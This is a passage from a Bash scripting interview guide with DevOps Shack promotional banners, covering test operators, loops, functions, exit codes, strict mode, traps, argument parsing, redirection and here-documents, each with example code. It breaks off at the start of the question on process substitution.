<details>
<summary><b>Answer</b></summary>

| Test | True if |
|---|---|
| `-e f` | exists (any type) |
| `-f f` | regular file |
| `-d f` | directory |
| `-L f` / `-h f` | symlink |
| `-s f` | exists and size > 0 |
| `-r` / `-w` / `-x f` | readable / writable / executable by you |
| `f1 -nt f2` | f1 newer than f2 (mtime) |
| `-S f` / `-p f` | socket / named pipe |

```bash
[[ -s /var/backups/latest.tar.gz ]] || die "backup missing or empty"
[[ -x /usr/local/bin/aws ]] || die "aws CLI not installed"
```

`-e` follows symlinks, so a broken symlink fails `-e` but passes `-L`.

</details>

### Q52. What are the string and integer comparison operators in `[[ ]]` and `[ ]`? 🟢

<details>
<summary><b>Answer</b></summary>

Strings: `==` / `=` (equal), `!=`, `<` / `>` (sort order), `-z` (empty), `-n` (non-empty). Integers in `[ ]`/`[[ ]]`: `-eq -ne -lt -le -gt -ge`.

```bash
[[ $env == prod ]]
[[ -z ${TOKEN:-} ]] && die "TOKEN is empty"
[[ $count -gt 10 ]]        # integer compare
[[ $count > 10 ]]          # STRING compare: "9" > "10" is true!
(( count > 10 ))           # clearest for numbers
```

Mixing them up is a classic bug: `>` inside `[[ ]]` compares lexicographically, and inside `[ ]` it is a redirection that creates a file named `10`.

</details>

### Q53. How does pattern matching and regex matching work in `[[ ]]`? 🟡

<details>
<summary><b>Answer</b></summary>

`==` with an **unquoted** right side is a glob pattern; `=~` is an extended regex, with captures in `BASH_REMATCH`.

```bash
[[ $branch == release/* ]] && echo "release branch"
[[ $branch == "release/*" ]]           # quoted: literal string compare

if [[ $tag =~ ^v([0-9]+)\.([0-9]+)\.([0-9]+)$ ]]; then
  major=${BASH_REMATCH[1]} minor=${BASH_REMATCH[2]}
fi
```

Do not quote the regex: `[[ $x =~ "^[0-9]+$" ]]` matches the literal characters. For complex regexes, store them in a variable: `re='^[a-z0-9-]{3,63}$'; [[ $name =~ $re ]]`.

</details>

### Q54. How does `case` work, and when is it better than `if/elif`? 🟢

<details>
<summary><b>Answer</b></summary>

`case` matches a word against glob patterns, top to bottom, and runs the first match.

```bash
case $1 in
  start|up)        start_app ;;
  stop|down)       stop_app ;;
  deploy)          shift; deploy "$@" ;;
  -h|--help)       usage; exit 0 ;;
  *.tar.gz)        extract "$1" ;;
  *)               echo "unknown command: $1" >&2; usage >&2; exit 2 ;;
esac
```

It is clearer than chained `if` for subcommands, file types and environment names, and it works in POSIX sh. Bash also supports `;&` (fall through) and `;;&` (continue testing).

</details>

### Q55. What are the loop forms in Bash? 🟢

<details>
<summary><b>Answer</b></summary>

```bash
for host in web1 web2 web3; do ...; done        # list
for f in /var/log/app/*.log; do ...; done       # glob
for ((i = 1; i <= 5; i++)); do ...; done        # C-style
while systemctl is-active --quiet app; do sleep 5; done   # while condition succeeds
until curl -fsS localhost:8080/healthz; do sleep 2; done  # until it succeeds
while IFS= read -r line; do ...; done < file    # lines of a file
```

`break` exits the loop, `continue` skips to the next iteration; both accept a level number for nested loops (`break 2`).

</details>

### Q56. Why is `for line in $(cat file)` wrong? 🟡

<details>
<summary><b>Answer</b></summary>

The command substitution is unquoted, so it is split on every space, tab and newline (not just lines) and each word is glob-expanded. A line `ERROR disk * full` becomes four iterations, one of which expands to every filename in the current directory.

```bash
while IFS= read -r line; do
  process "$line"
done < file
```

ShellCheck flags this pattern as SC2013 ("To read lines rather than words, pipe/redirect to a 'while read' loop").

</details>

### Q57. Why are variables set inside `cmd | while read` lost after the loop? 🔴

<details>
<summary><b>Answer</b></summary>

Each part of a pipeline runs in its own subshell, so the `while` loop's variables die with that subshell.

```bash
count=0
grep ERROR app.log | while read -r _; do ((count++)); done
echo "$count"     # 0

count=0
while read -r _; do ((count++)) || true; done < <(grep ERROR app.log)
echo "$count"     # correct
```

Alternatives: `shopt -s lastpipe` (runs the last stage in the current shell when job control is off, which is the case in scripts), or just `grep -c ERROR app.log`.

</details>

### Q58. Why does an `ssh` or `docker exec` command inside a `while read` loop only process the first line? 🔴

<details>
<summary><b>Answer</b></summary>

The loop reads from stdin, and `ssh` (also `docker exec -i`, `ffmpeg`, `mysql`) also reads stdin, consuming the rest of the file in the first iteration.

```bash
while IFS= read -r host; do
  ssh -n "$host" uptime              # -n: stdin from /dev/null
done < hosts.txt

# or give the loop its own file descriptor
while IFS= read -r host <&3; do
  ssh "$host" uptime
done 3< hosts.txt
```

</details>

### Q59. How do you loop over files whose names may contain spaces or newlines? 🟡

<details>
<summary><b>Answer</b></summary>

Globs are safe in a `for` loop because each match becomes exactly one word. For recursive searches use NUL separators:

```bash
shopt -s nullglob
for f in /var/log/app/*.log; do gzip -- "$f"; done

find /data -type f -name '*.csv' -print0 |
  while IFS= read -r -d '' f; do
    process -- "$f"
  done
```

Never parse `ls` output (SC2012): names with newlines or spaces break it, and `ls` output is meant for humans.

</details>

### Q60. How do you write an infinite loop with a timeout, for example waiting for a service? 🟡

<details>
<summary><b>Answer</b></summary>

```bash
wait_for_http() {   # wait_for_http URL TIMEOUT_SECONDS
  local url=$1 deadline=$((SECONDS + $2))
  until curl -fsS -o /dev/null --max-time 3 "$url"; do
    if (( SECONDS >= deadline )); then
      echo "timed out waiting for $url" >&2
      return 1
    fi
    sleep 2
  done
}
wait_for_http http://127.0.0.1:8080/readyz 60 || exit 1
```

Always cap retries with a deadline; an unbounded `until` loop hangs a deploy forever. The `timeout 60 bash -c '...'` wrapper is another option.

</details>

### Q61. What does `shift` do, and how do you parse long options without `getopts`? 🟡

<details>
<summary><b>Answer</b></summary>

`shift` drops `$1` and moves the rest down; `shift 2` drops two. It returns non-zero (silently, unless `shopt -s shift_verbose`) if there are not enough arguments.

```bash
env="" dry_run=0
while (($#)); do
  case $1 in
    -e|--env)   env=${2:?--env needs a value}; shift 2 ;;
    --env=*)    env=${1#*=}; shift ;;
    -n|--dry-run) dry_run=1; shift ;;
    --)         shift; break ;;
    -*)         echo "unknown option: $1" >&2; exit 2 ;;
    *)          break ;;
  esac
done
```

This hand-written loop is the usual way to support `--long` options, since Bash's `getopts` only handles short ones.

</details>

### Q62. What is the `select` statement used for? 🟢

<details>
<summary><b>Answer</b></summary>

`select` prints a numbered menu from a list and reads the user's choice into a variable, repeating until `break`.

```bash
PS3="Deploy to which environment? "
select env in dev staging prod quit; do
  case $env in
    quit) exit 0 ;;
    "")   echo "invalid choice" ;;
    *)    echo "deploying to $env"; break ;;
  esac
done
```

Useful for interactive runbooks; never in automation, which has no terminal.

</details>

### Q63. How do you check if an element exists in an array? 🟡

<details>
<summary><b>Answer</b></summary>

```bash
contains() {          # contains NEEDLE ELEMENT...
  local needle=$1 e
  shift
  for e in "$@"; do [[ $e == "$needle" ]] && return 0; done
  return 1
}
allowed=(dev staging prod)
contains "$env" "${allowed[@]}" || die "invalid env: $env"
```

For frequent lookups, use an associative array as a set: `declare -A ok=([dev]=1 [staging]=1 [prod]=1); [[ -v ok[$env] ]]`. Avoid `[[ " ${arr[*]} " == *" $x "* ]]`, which breaks on elements with spaces.

</details>

### Q64. How do you process a CSV file line by line into fields? 🟡

<details>
<summary><b>Answer</b></summary>

```bash
while IFS=, read -r username group shell _rest; do
  [[ -z $username || $username == \#* ]] && continue   # skip blanks and comments
  echo "user=$username group=$group shell=${shell:-/bin/bash}"
done < <(tail -n +2 users.csv)                         # skip the header
```

The last variable receives the remainder of the line, so add `_rest` to absorb extra columns. This only handles simple CSV: quoted fields with embedded commas need a real parser (`python3 -c 'import csv...'`, `mlr`, or `csvkit`).

</details>

### Q65. What does `seq` do, and when should you use a C-style loop or brace expansion instead? 🟢

<details>
<summary><b>Answer</b></summary>

`seq` prints a number sequence: `seq 1 5`, `seq -w 01 10` (zero-padded), `seq 0 5 30` (step 5). It is an external command, so for pure Bash loops use `for ((i=1; i<=n; i++))`, which works with variables. Brace expansion `{1..10}` is fastest but only works with literal numbers.

```bash
for ((i = 1; i <= replicas; i++)); do echo "worker-$i"; done
```

</details>

### Q66. How do you exit a loop early from inside a nested loop or a pipeline? 🟡

<details>
<summary><b>Answer</b></summary>

`break N` and `continue N` take the number of enclosing loops to affect:

```bash
for region in ap-south-1 us-east-1; do
  for az in a b c; do
    if az_unavailable "$region$az"; then continue 2; fi   # next region
    deploy "$region$az" || break 2                         # stop everything
  done
done
```

Inside `cmd | while ...`, `break` only leaves the subshell's loop; `exit` exits only the subshell. Use process substitution if you need to stop the whole script from inside the loop.

</details>

### Q67. Why is `if cmd; then` better than running `cmd` and checking `$?` afterwards? 🟢

<details>
<summary><b>Answer</b></summary>

`if` tests a command's exit status directly, so you rarely need `$?`:

```bash
# Weak: $? is overwritten by any command in between, and set -e may exit first
grep -q ERROR app.log
if [ $? -eq 0 ]; then alert; fi

# Strong
if grep -q ERROR app.log; then alert; fi
```

Use `$?` only when you must branch on specific codes: `rc=0; cmd || rc=$?; case $rc in 1) ... ;; 2) ... ;; esac`. ShellCheck reports the weak form as SC2181.

</details>

### Q68. How do you compare two version strings in Bash? 🔴

<details>
<summary><b>Answer</b></summary>

String comparison fails (`1.10` sorts before `1.9`). Use GNU `sort -V`:

```bash
version_ge() {   # version_ge A B  -> true if A >= B
  [[ "$(printf '%s\n' "$2" "$1" | sort -V | head -n1)" == "$2" ]]
}
current=$(kubectl version --client -o json | jq -r .clientVersion.gitVersion)
version_ge "${current#v}" 1.29.0 || die "kubectl $current is too old, need >= 1.29"
```

For strict semver with pre-release tags (`1.2.0-rc.1`), `sort -V` is not fully semver-compliant; use a dedicated tool if that matters.

</details>

### Q69. How do you make a script process items in parallel with a concurrency limit, in pure Bash? 🔴

<details>
<summary><b>Answer</b></summary>

```bash
max_jobs=4 rc=0
for host in "${hosts[@]}"; do
  while (( $(jobs -rp | wc -l) >= max_jobs )); do
    wait -n || rc=1                  # Bash 4.3+: wait for any one job
  done
  deploy_host "$host" &
done
while (( $(jobs -rp | wc -l) > 0 )); do wait -n || rc=1; done
exit "$rc"
```

`xargs -P 4` or GNU `parallel` are simpler for one-command-per-item. Always capture per-job failures; plain `wait` returns 0 even if a job failed.

</details>

### Q70. What is the `:` (colon) command and where is it useful? 🟡

<details>
<summary><b>Answer</b></summary>

`:` is a builtin that does nothing and returns 0. Uses:

```bash
: "${APP_ENV:=dev}"            # apply a default without running anything
: > /var/log/app/debug.log     # truncate a file
while :; do check; sleep 60; done   # infinite loop
if is_ready; then :; else start; fi # placeholder branch
```

The arguments are still expanded, which is exactly why `: "${VAR:?msg}"` works as an assertion.

</details>

---

## Functions, exit codes, strict mode and traps

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q71. How do you define a function, pass arguments and return a value? 🟢

<details>
<summary><b>Answer</b></summary>

```bash
disk_pct() {                  # disk_pct MOUNTPOINT -> prints usage percent
  local mount=$1
  df -P -- "$mount" | awk 'NR == 2 {sub(/%/, "", $5); print $5}'
}

pct=$(disk_pct /var)          # "return" data by printing it
if (( pct > 90 )); then ...; fi
```

Arguments are `$1`, `$2`, ... and `"$@"`, just like a script. `return N` sets the exit status (0 to 255); it is not for data. A function's status without `return` is the status of its last command.

</details>

### Q72. What does `local` do, and what is dynamic scoping? 🔴

<details>
<summary><b>Answer</b></summary>

`local` limits a variable to the function and the functions it calls. Bash scoping is **dynamic**: a called function sees (and can modify) its caller's locals, not just globals.

```bash
n=100
counter() { n=$((n + 1)); }
retry() { local n=1; counter; echo "inside: $n"; }   # counter changed retry's n
retry; echo "global: $n"     # inside: 2   global: 100
```

This causes real bugs when a helper like `retry` declares `local n` and the retried function uses a global `n`. Prefix helper locals (`_try`, `_rc`) in shared libraries.

</details>

### Q73. Why is `local out=$(cmd)` a problem under `set -e`? 🔴

<details>
<summary><b>Answer</b></summary>

The exit status of `local out=$(cmd)` is the status of `local` (0), not of `cmd`, so failures are silently ignored even with `set -e`. The same applies to `export x=$(cmd)` and `readonly x=$(cmd)`. ShellCheck reports SC2155.

```bash
local out
out=$(curl -fsS "$url")      # now set -e (or || return) sees curl's status
```

</details>

### Q74. What are the conventional exit codes, and what do 126, 127, 130, 137 and 143 mean? 🟢

<details>
<summary><b>Answer</b></summary>

| Code | Meaning |
|---|---|
| 0 | success |
| 1 | general error |
| 2 | misuse of a builtin / bad usage |
| 126 | file found but not executable (`Permission denied`) |
| 127 | command not found |
| 128+N | killed by signal N |
| 130 | SIGINT (Ctrl+C) |
| 137 | SIGKILL (often the OOM killer or `kill -9`) |
| 143 | SIGTERM |

Exit codes are taken modulo 256, so `exit 256` is 0 and `exit -1` is 255. Define your own codes (e.g. 3 = config error) in the usage text so callers can branch on them.

</details>

### Q75. What does `set -e` do, and where does it NOT cause an exit? 🔴

<details>
<summary><b>Answer</b></summary>

`set -e` (errexit) exits the shell when a command returns non-zero, **unless** the failure is "checked":

- in the condition of `if`, `elif`, `while`, `until`
- on the left of `&&` or `||` (only the last command in the list counts)
- after `!`
- in any command of a pipeline except the last (without `pipefail`)
- inside a function called from any of the above contexts, even deep inside it
- in command substitution in older Bash, unless `shopt -s inherit_errexit` (4.4+)

```bash
set -e
check() { false; echo "still running"; }
if check; then echo ok; fi    # prints "still running" and "ok"
```

So `set -e` is a safety net, not error handling. Check critical commands explicitly.

</details>

### Q76. Explain `set -euo pipefail` line by line, and add the `-E` flag. 🟢

<details>
<summary><b>Answer</b></summary>

```bash
set -Eeuo pipefail
```

- `-e`: exit when an unchecked command fails.
- `-u`: treat expansion of an unset variable as an error (`DB_HOST: unbound variable`), catching typos.
- `-o pipefail`: a pipeline's status is the last non-zero status of any stage, so `curl ... | jq ...` fails if `curl` fails.
- `-E`: the `ERR` trap is inherited by functions, command substitutions and subshells.

Write defaults for optional variables with `${VAR:-}` so `-u` does not trip on legitimately unset values.

</details>

### Q77. Why can `((count++))` kill a script under `set -e`? 🟡

<details>
<summary><b>Answer</b></summary>

`(( expr ))` returns 1 when the expression evaluates to 0. Post-increment returns the **old** value, so when `count` is 0, `((count++))` evaluates to 0, returns status 1, and `set -e` exits.

```bash
set -e
count=0
((count++))        # script exits here
((++count))        # fine (evaluates to 1)
count=$((count + 1))   # clearest and always safe
```

</details>

### Q78. How does `pipefail` interact with `head`, `grep -q` and SIGPIPE? 🔴

<details>
<summary><b>Answer</b></summary>

When a reader exits early (`head -1`, `grep -q`), the writer gets `SIGPIPE` on its next write and dies with status 141 (128+13). With `pipefail`, the pipeline then fails even though you got the answer you wanted.

```bash
set -o pipefail
yes | head -n1; echo "${PIPESTATUS[@]}"   # 141 0 -> pipeline status 141

first_pod=$(kubectl get pods -o name | head -n1)   # may fail randomly on large output
```

Fixes: have the producer limit its own output where it can (`--max-items`, `--limit`, `-m1`), read everything first and then slice (`mapfile -t pods < <(kubectl get pods -o name); first=${pods[0]}`), or tolerate 141 explicitly for that one pipeline: `{ yes | head -n1; } || (( PIPESTATUS[0] == 141 ))`.

</details>

### Q79. What is `trap`, and what are the common signals and pseudo-signals? 🟢

<details>
<summary><b>Answer</b></summary>

`trap 'commands' SIGNAL...` runs commands when the shell receives a signal or hits a pseudo-signal.

| Name | When |
|---|---|
| `EXIT` | shell exits for any reason (normal, `exit`, error under `-e`, handled signal) |
| `ERR` | a command fails (same rules as `set -e`) |
| `INT` | Ctrl+C (SIGINT) |
| `TERM` | `kill`, `systemctl stop`, `docker stop`, Kubernetes pod termination |
| `HUP` | terminal closed; daemons use it for "reload config" |
| `DEBUG` / `RETURN` | before each command / after a function returns |

`SIGKILL` and `SIGSTOP` cannot be trapped. `trap -p` lists traps; `trap - EXIT` removes one.

</details>

### Q80. How do you guarantee temp file cleanup with `trap`? 🟢

<details>
<summary><b>Answer</b></summary>

```bash
tmpdir=$(mktemp -d)
trap 'rm -rf -- "$tmpdir"' EXIT

curl -fsSo "$tmpdir/app.tgz" "$url"
tar -xzf "$tmpdir/app.tgz" -C "$tmpdir"
```

The `EXIT` trap runs on normal exit, on `exit N`, on a `set -e` failure, and after a trapped `INT`/`TERM` causes an exit. Use single quotes so `$tmpdir` is expanded when the trap fires. Set the trap immediately after creating the resource.

</details>

### Q81. How do you write an ERR trap that reports the failing line and command? 🟡

<details>
<summary><b>Answer</b></summary>

```bash
set -Eeuo pipefail
on_err() {
  local rc=$1 line=$2 cmd=$3
  echo "ERROR: line $line: '$cmd' exited with $rc" >&2
}
trap 'on_err $? $LINENO "$BASH_COMMAND"' ERR
```

Capture `$?` as the first thing in the trap string, before any other command overwrites it. `-E` makes the trap fire inside functions too. For a stack trace, loop over `FUNCNAME`, `BASH_SOURCE` and `BASH_LINENO` in `on_err`.

</details>

### Q82. How do you handle SIGTERM gracefully in a long-running script? 🟡

<details>
<summary><b>Answer</b></summary>

```bash
stop=0
trap 'stop=1' TERM INT
while (( ! stop )); do
  process_next_batch
  sleep 5 & wait $!          # wait is interruptible by signals, sleep is not
done
echo "finished current batch, exiting cleanly"
```

Bash defers trap handling until the current foreground command finishes, so a plain `sleep 300` delays shutdown by up to 300 seconds. Running `sleep` in the background and `wait`ing on it lets the trap fire immediately. This matters for systemd's `TimeoutStopSec` and Kubernetes' `terminationGracePeriodSeconds`.

</details>

### Q83. What is the difference between `exit` and `return`? 🟢

<details>
<summary><b>Answer</b></summary>

`return` leaves a function (or a sourced file) with a status; `exit` terminates the whole shell. In a sourced library, `exit` kills the user's interactive shell, so libraries should `return`. Inside `$( )` or `( )`, `exit` only ends the subshell.

```bash
validate() { [[ -n $1 ]] || return 1; }
validate "$ENV" || { echo "ENV missing" >&2; exit 2; }
```

</details>

### Q84. How do you write a reusable `die` function, and why send errors to stderr? 🟢

<details>
<summary><b>Answer</b></summary>

```bash
die() {
  printf 'ERROR: %s\n' "$*" >&2
  exit "${2:-1}"
}
[[ -f $config ]] || die "config not found: $config"
```

stdout is for data the caller may capture or pipe (`ips=$(get_ips)`); stderr is for humans and logs. If errors go to stdout, they end up inside variables and pipelines, and `cron`/`systemd` cannot separate them.

</details>

### Q85. What does `set -u` break, and how do you deal with optional variables and empty arrays? 🔴

<details>
<summary><b>Answer</b></summary>

`set -u` fails on any reference to an unset variable, including optional environment variables and positional parameters that were not passed.

```bash
set -u
debug=${DEBUG:-0}          # default for optional vars
first=${1:-}               # optional argument
[[ -n ${AWS_PROFILE-} ]]   # test without failing
```

Bash before 4.4 also treated `"${arr[@]}"` on an empty array as unbound (`arr[@]: unbound variable`); workaround `${arr[@]+"${arr[@]}"}`. Bash 4.4+ (all current distros) handles empty arrays correctly, but macOS's 3.2 does not.

</details>

### Q86. How do you implement retry with exponential backoff as a function? 🟡

<details>
<summary><b>Answer</b></summary>

```bash
retry() {                       # retry ATTEMPTS DELAY cmd args...
  local _max=$1 _delay=$2 _try=1 _rc
  shift 2
  until "$@"; do
    _rc=$?
    (( _try >= _max )) && return "$_rc"
    echo "attempt $_try/$_max failed ($_rc), retry in ${_delay}s" >&2
    sleep "$_delay"
    _try=$((_try + 1)) _delay=$((_delay * 2))
  done
}
retry 5 2 aws s3 cp "$archive" "s3://$bucket/$key"
```

Pass the command as separate arguments (`"$@"`), never as a string to `eval`. Add jitter (`sleep $((_delay + RANDOM % 3))`) when many hosts retry at once. Only retry idempotent operations.

</details>

### Q87. What does `set -o noclobber` do and when is it useful? 🔴

<details>
<summary><b>Answer</b></summary>

With `set -C` (noclobber), `>` refuses to overwrite an existing file (`cannot overwrite existing file`); `>|` forces it. It is useful as an atomic "create if not exists" lock in POSIX sh:

```bash
if ( set -C; echo "$$" > /var/run/myjob.lock ) 2>/dev/null; then
  trap 'rm -f /var/run/myjob.lock' EXIT
else
  echo "already running (pid $(cat /var/run/myjob.lock))" >&2; exit 0
fi
```

On Linux, `flock` is more robust because the lock disappears automatically if the process is killed.

</details>

### Q88. How does `flock` prevent concurrent runs of a script? 🟡

<details>
<summary><b>Answer</b></summary>

`flock` takes an advisory kernel lock on a file. The lock is tied to the open file descriptor, so it is released automatically when the process exits, even on `kill -9`, unlike PID files.

```bash
exec 9>/run/lock/backup.lock
flock -n 9 || { echo "backup already running" >&2; exit 0; }
# ... rest of the script holds the lock until exit

# or wrap a whole command, e.g. in cron:
flock -n /run/lock/backup.lock /opt/opskit/bin/opskit-backup
```

`-n` fails immediately; `-w 30` waits up to 30 seconds; without either it blocks.

</details>

### Q89. What is the `RETURN` trap and the `DEBUG` trap used for? 🔴

<details>
<summary><b>Answer</b></summary>

`DEBUG` runs before every simple command, `RETURN` after a function or sourced file returns. They are used for tracing and tooling, rarely in production scripts.

```bash
trap 'echo "+ $BASH_COMMAND" >&2' DEBUG       # poor man's tracer
f() { trap 'echo "leaving f"' RETURN; ...; }  # per-function cleanup
```

By default, functions do not inherit `DEBUG` and `RETURN` traps; `set -T` (functrace) changes that. `DEBUG` traps are expensive and slow a script noticeably.

</details>

### Q90. How do you make a function's cleanup run even if a command in the middle fails? 🔴

<details>
<summary><b>Answer</b></summary>

Run the body in a subshell with its own `EXIT` trap, so cleanup is scoped to the function:

```bash
with_maintenance() (            # note: ( ) body = subshell
  set -e
  enable_maintenance_page
  trap disable_maintenance_page EXIT
  "$@"
)
with_maintenance run_migrations || die "migration failed, maintenance page removed"
```

The trap fires when the subshell exits for any reason. The cost: variable changes inside the function do not reach the caller.

</details>

### Q91. What is the exit status of a pipeline, a subshell, a function and a script? 🟡

<details>
<summary><b>Answer</b></summary>

- Pipeline: status of the last command (or last non-zero with `pipefail`); `! pipeline` negates it.
- Subshell `( ... )`: status of its last command or its `exit N`.
- Function: status of `return N` or its last command.
- Script: status of `exit N` or its last command. A script that ends with `[[ -n $x ]] && echo ok` returns 1 when `$x` is empty, which surprises cron and CI.

End scripts with an explicit `exit 0` (or `main "$@"` whose last command is meaningful).

</details>

### Q92. How do you get the exit status of every command in a pipeline? 🔴

<details>
<summary><b>Answer</b></summary>

```bash
pg_dump app | gzip > app.sql.gz
st=("${PIPESTATUS[@]}")         # copy immediately; the next command overwrites it
if (( st[0] != 0 )); then echo "pg_dump failed (${st[0]})" >&2; exit 1; fi
if (( st[1] != 0 )); then echo "gzip failed (${st[1]})" >&2; exit 1; fi
```

Without this (or `pipefail`), a failed `pg_dump` produces a valid but empty `.gz`, and your backup job reports success. This is a top cause of "we had backups but they were empty".

</details>

### Q93. What does `inherit_errexit` change? 🔴

<details>
<summary><b>Answer</b></summary>

Before Bash 4.4 (and by default after, outside POSIX mode), command substitutions do not inherit `set -e`, so a failure inside `$( )` does not stop the commands after it inside the substitution:

```bash
set -e
out=$(false; echo "kept going")   # out="kept going", assignment status is 0
shopt -s inherit_errexit
out=$(false; echo "kept going")   # subshell exits at false; assignment fails; script exits
```

We add `shopt -s inherit_errexit` to strict-mode headers on Bash 4.4+.

</details>

### Q94. How do you return multiple values from a function? 🟡

<details>
<summary><b>Answer</b></summary>

Options, from simplest:

```bash
# 1. Print lines and read them
get_disk() { df -P / | awk 'NR==2 {print $2, $3, $5}'; }
read -r total used pct < <(get_disk)

# 2. Write into caller-named variables with namerefs (Bash 4.3+)
get_mem() { local -n _total=$1 _avail=$2
  _total=$(awk '/MemTotal/ {print $2}' /proc/meminfo)
  _avail=$(awk '/MemAvailable/ {print $2}' /proc/meminfo); }
get_mem mt ma

# 3. Set well-known globals (document them)
```

Avoid `eval` for this.

</details>

### Q95. What is the danger of `cd dir` without checking, and how do you fix it? 🟡

<details>
<summary><b>Answer</b></summary>

If `cd` fails, the script continues in the wrong directory, and the next command operates on the wrong files:

```bash
cd /srv/app/releases/old
rm -rf ./*            # if cd failed, this deletes files in the current directory
```

```bash
cd /srv/app/releases/old || exit 1
# or avoid cd entirely
rm -rf -- /srv/app/releases/old
# or isolate it
( cd /srv/app && tar -czf /tmp/app.tgz . )
```

ShellCheck reports SC2164 for unchecked `cd`.

</details>

### Q96. How do you time sections of a script and the script as a whole? 🟢

<details>
<summary><b>Answer</b></summary>

```bash
SECONDS=0
build; echo "build: ${SECONDS}s"

start=$EPOCHREALTIME              # Bash 5: microsecond precision
deploy
end=$EPOCHREALTIME
echo "deploy: $(awk "BEGIN {printf \"%.2f\", $end - $start}")s"

time ./deploy.sh                  # real, user, sys for the whole thing
```

Send timings to logs or a metrics endpoint so you can see deploys getting slower over weeks.

</details>

### Q97. What does `wait` return when a background job is killed by a signal? 🔴

<details>
<summary><b>Answer</b></summary>

`wait PID` returns 128 + signal number, the same convention as a foreground command. If the PID is not a child of this shell, it returns 127 with `wait: pid N is not a child of this shell`.

```bash
sleep 100 & pid=$!
kill -TERM "$pid"
wait "$pid"; echo $?     # 143
```

Note that `$!` refers to the last background job only; store PIDs in an array as you start jobs.

</details>

### Q98. How do you write a script that is safe to run twice (idempotent)? 🟡

<details>
<summary><b>Answer</b></summary>

Check state before changing it, and make every step converge to the desired state:

```bash
id -u deploy &>/dev/null || useradd --system --create-home deploy
mkdir -p /srv/app/releases
grep -qxF 'vm.swappiness=10' /etc/sysctl.d/99-app.conf 2>/dev/null ||
  echo 'vm.swappiness=10' >> /etc/sysctl.d/99-app.conf
ln -sfn "/srv/app/releases/$release" /srv/app/current
systemctl enable --now app.service
```

Prefer declarative commands (`mkdir -p`, `ln -sfn`, `install -d`, `systemctl enable --now`) over imperative ones that fail or duplicate on rerun (`mkdir`, `>>` without a check, `useradd` without a check).

</details>

---

## Arguments, I/O, here-docs, process substitution and subshells

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q99. How does `getopts` work? Show a complete example. 🟡

<details>
<summary><b>Answer</b></summary>

`getopts OPTSTRING VAR` parses short options one at a time. A letter followed by `:` takes an argument (in `$OPTARG`). A leading `:` in the optstring enables silent mode, where you handle errors yourself: `?` for unknown options, `:` for a missing argument.

```bash
env="" verbose=0
while getopts ':e:vh' opt; do
  case $opt in
    e) env=$OPTARG ;;
    v) verbose=1 ;;
    h) usage; exit 0 ;;
    :) echo "option -$OPTARG requires an argument" >&2; exit 2 ;;
    \?) echo "unknown option -$OPTARG" >&2; exit 2 ;;
  esac
done
shift $((OPTIND - 1))        # "$@" is now the non-option arguments
[[ -n $env ]] || { echo "-e is required" >&2; exit 2; }
```

`getopts` supports bundling (`-ve prod`) and stops at `--` or the first non-option.

</details>

### Q100. What is the difference between `getopts` and `getopt`? 🔴

<details>
<summary><b>Answer</b></summary>

`getopts` is a POSIX shell builtin: portable, short options only. `getopt` is an external program; the GNU version (util-linux) supports long options and reorders arguments, but the BSD/macOS version is broken with spaces in arguments.

```bash
opts=$(getopt -o e:v --long env:,verbose -n "$0" -- "$@") || exit 2
eval set -- "$opts"          # getopt quotes its output safely for eval
while true; do
  case $1 in
    -e|--env) env=$2; shift 2 ;;
    -v|--verbose) verbose=1; shift ;;
    --) shift; break ;;
  esac
done
```

For portability we use `getopts` or a hand-written `while/case` loop for long options.

</details>

### Q101. Explain file descriptors 0, 1 and 2 and the main redirection operators. 🟢

<details>
<summary><b>Answer</b></summary>

0 is stdin, 1 is stdout, 2 is stderr.

| Syntax | Effect |
|---|---|
| `> f` / `>> f` | stdout to file (truncate / append) |
| `2> f` | stderr to file |
| `&> f` or `> f 2>&1` | both to file |
| `2>&1` | stderr to wherever stdout points **now** |
| `< f` | stdin from file |
| `>&2` | this command's stdout to stderr |
| `2>/dev/null` | discard errors |
| `cmd 2>&1 \| tee log` | both streams to screen and file |

</details>

### Q102. Why is `cmd 2>&1 > file` different from `cmd > file 2>&1`? 🔴

<details>
<summary><b>Answer</b></summary>

Redirections are processed left to right, and `2>&1` copies wherever fd 1 points at that moment.

- `> file 2>&1`: fd 1 → file, then fd 2 → (fd 1 = file). Both go to the file.
- `2>&1 > file`: fd 2 → (fd 1 = terminal), then fd 1 → file. Errors still go to the terminal.

The second form is occasionally useful on purpose: `out=$(cmd 2>&1 >/dev/null)` captures only stderr.

</details>

### Q103. What is a here-document, and what is the difference between `<<EOF`, `<<'EOF'` and `<<-EOF`? 🟢

<details>
<summary><b>Answer</b></summary>

A here-doc feeds the following lines to a command's stdin until the delimiter line.

```bash
cat > /etc/app/app.env <<EOF           # unquoted: $vars and $(cmds) expand
APP_ENV=$env
BUILD=$(git rev-parse --short HEAD)
EOF

cat > deploy-remote.sh <<'EOF'         # quoted: literal, nothing expands
echo "running on $(hostname) as $USER"
EOF

if true; then
	cat <<-EOF                        # <<- strips leading TABS (not spaces)
	indented with tabs
	EOF
fi
```

The closing delimiter must be alone on its line with no trailing spaces. Use `<<'EOF'` when generating scripts or configs containing `$` that must survive.

</details>

### Q104. What is a here-string (`<<<`)? 🟡

<details>
<summary><b>Answer</b></summary>

`cmd <<< "string"` sends a single string (plus a trailing newline) to stdin, without `echo |` and without a pipeline subshell.

```bash
read -r major minor patch <<< "${version//./ }"
jq -r '.status' <<< "$response"
grep -q '^ERROR' <<< "$output" && alert
```

It is Bash-only (not POSIX sh).

</details>

### Q105. How do you send a here-doc to a remote server over SSH, and when should variables expand locally vs remotely? 🔴

<details>
<summary><b>Answer</b></summary>

```bash
release=v42
ssh -o BatchMode=yes deploy@web1 bash -s -- "$release" <<'REMOTE'
set -euo pipefail
release=$1                               # passed as an argument, expands remotely
cd /srv/app && ln -sfn "releases/$release" current
sudo systemctl reload app
echo "now on $(readlink current) at $(hostname)"
REMOTE
```

With `<<'REMOTE'` everything expands on the remote host, and local values are passed as arguments to `bash -s --`. With an unquoted delimiter, everything expands locally first, which is easy to get wrong (`$(hostname)` would be the local host). Passing arguments also avoids quoting a value into the script text, which is an injection risk.

</details>

### Q106. What is process substitution and when do you use it? 🟡

<details>
<summary><b>Answer</b></summary>

